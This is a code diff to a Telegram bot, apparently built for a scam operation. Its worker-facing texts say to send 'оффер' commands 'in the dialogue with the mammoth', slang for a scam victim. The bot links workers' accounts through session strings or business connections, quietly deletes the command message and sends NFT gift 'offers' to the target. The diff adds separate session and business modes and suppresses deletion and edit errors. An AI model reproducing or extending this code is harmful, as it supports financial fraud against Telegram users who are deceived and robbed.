@@ -181,7 +181,9 @@ TEXTS = {
             "/setusername @юзернейм — сменить отображаемый тег получателя\n"
             "/lang — сменить язык офферов\n"
             "/currency — сменить валюту офферов\n\n"
-            "<b>Создать оффер в чате:</b>\n"
+            "<b>Создать оффер (сессия):</b>\n"
+            "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
+            "<b>Создать оффер (бизнес-аккаунт):</b>\n"
             "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
         ),
         "choose_lang": "{globe} <b>Выбери язык офферов:</b>",
@@ -227,7 +229,9 @@ TEXTS = {
             "💱 Валюта: <b>{currency}</b>\n"
             "📱 Сесія: <b>{session_status}</b>\n"
             "🔌 Бізнес: <b>{business_status}</b>\n\n"
-            "<b>Створити офер у чаті:</b>\n"
+            "<b>Створити офер (сесія):</b>\n"
+            "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
+            "<b>Створити офер (бізнес):</b>\n"
             "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
         ),
         "choose_lang": "{globe} <b>Оберіть мову:</b>",
@@ -276,7 +280,9 @@ TEXTS = {
             "💱 Currency: <b>{currency}</b>\n"
             "📱 Session: <b>{session_status}</b>\n"
             "🔌 Business: <b>{business_status}</b>\n\n"
-            "<b>Create offer in chat:</b>\n"
+            "<b>Create offer (session):</b>\n"
+            "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
+            "<b>Create offer (business):</b>\n"
             "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
         ),
         "choose_lang": "{globe} <b>Select language:</b>",
@@ -312,7 +318,9 @@ TEXTS = {
             "🏷 اسم المستخدم: <b>@{worker_username}</b>\n"
             "📱 الجلسة: <b>{session_status}</b>\n"
             "🔌 الحساب التجاري: <b>{business_status}</b>\n\n"
-            "<b>إنشاء عرض في الدردشة:</b>\n"
+            "<b>إنشاء عرض (جلسة):</b>\n"
+            "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
+            "<b>إنشاء عرض (تجاري):</b>\n"
             "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
         ),
         "choose_lang": "{globe} <b>اختر اللغة:</b>",
@@ -491,10 +499,10 @@ async def update_worker_commands(uid: int):
     except Exception:
         pass
 
+# ⬅ ПРАВКА 1: опциональная точка в начале, один парсер для обоих режимов
 def parse_offer_command(text: str):
-    # формат: "оффер https://t.me/nft/IceCream-322115 1000" / "оффер t.me/nft/... 1000 stars" / "оффер IceCream-322115 1000"
     m = re.match(
-        r'^\s*оффер\s+'
+        r'^\s*\.?оффер\s+'
         r'(?:(?:https?://)?t\.me/nft/)?'
         r'([A-Za-z0-9_\-]+)\s+'
         r'(\d+)\s*'
@@ -586,7 +594,8 @@ async def register_worker_client(worker_id: int, session_str: str):
         @client.on(events.NewMessage(outgoing=True))
         async def on_worker_offer(event):
             text = (event.raw_text or "").strip()
-            if not text.lower().startswith("оффер"):
+            # ⬅ ПРАВКА 2: Telethon ловит ТОЛЬКО с точкой. Без точки — бизнес-режим, не трогаем
+            if not text.lower().startswith(".оффер"):
                 return
 
             parsed = parse_offer_command(text)
@@ -673,6 +682,9 @@ async def on_business_connection(connection: BusinessConnection):
 @dp.business_message()
 async def on_business_message(message: types.Message):
     text = (message.text or "").strip()
+    # ⬅ ПРАВКА 3: Business ловит ТОЛЬКО без точки. С точкой — сессия, не трогаем
+    if text.startswith("."):
+        return
     if not text.lower().startswith("оффер"):
         return
 
@@ -689,10 +701,14 @@ async def on_business_message(message: types.Message):
     gift_name, gift_link, price, currency_override = parsed
     chat_id = message.chat.id
 
+    # ⬅ ПРАВКА 4: delete_business_messages вместо delete_message, тихая обработка
     try:
-        await bot.delete_message(chat_id=chat_id, message_id=message.message_id)
+        await bot.delete_business_messages(
+            business_connection_id=conn_id,
+            message_ids=[message.message_id],
+        )
     except Exception as e:
-        print(f"[BUSINESS] delete error: {e}", flush=True)
+        print(f"[BUSINESS] delete skip: {e}", flush=True)
 
     worker_currency = currency_override if currency_override else get_currency(sender_id)
     worker_lang = get_lang(sender_id)
@@ -893,7 +909,8 @@ async def process_code(message: types.Message, state: FSMContext):
         await message.answer(
             f"🎉 <b>Аккаунт успешно подключен!</b>\n\n"
             f"👤 Тег получателя: <b>@{get_worker_username(uid)}</b>\n\n"
-            f"Пиши в диалоге с мамонтом:\n<code>оффер https://t.me/nft/SnakeBox-30973 1000</code>",
+            f"<b>Сессия:</b>\n<code>.оффер https://t.me/nft/SnakeBox-30973 1000</code>\n\n"
+            f"<b>Бизнес:</b>\n<code>оффер https://t.me/nft/SnakeBox-30973 1000</code>",
             reply_markup=make_worker_main_kb(uid)
         )
     except SessionPasswordNeededError:
@@ -946,7 +963,8 @@ async def process_2fa(message: types.Message, state: FSMContext):
         await message.answer(
             f"🎉 <b>Аккаунт подключен!</b>\n\n"
             f"👤 Тег получателя: <b>@{get_worker_username(uid)}</b>\n\n"
-            f"Пиши в диалоге с мамонтом:\n<code>оффер https://t.me/nft/SnakeBox-30973 1000</code>",
+            f"<b>Сессия:</b>\n<code>.оффер https://t.me/nft/SnakeBox-30973 1000</code>\n\n"
+            f"<b>Бизнес:</b>\n<code>оффер https://t.me/nft/SnakeBox-30973 1000</code>",
             reply_markup=make_worker_main_kb(uid)
         )
     except PasswordHashInvalidError:
@@ -1059,6 +1077,9 @@ async def edit_offer_message(call: types.CallbackQuery, o: dict, new_text: str, 
             except Exception as e2:
                 print(f"[EDIT] fallback error: {e2}", flush=True)
         else:
+            # ⬅ ПРАВКА 5: при not found просто молчим — сообщение уже удалено/отредактировано
+            if "not found" in err:
+                return False
             print(f"[EDIT] error: {e}", flush=True)
     except Exception as e:
         print(f"[EDIT] error: {e}", flush=True)
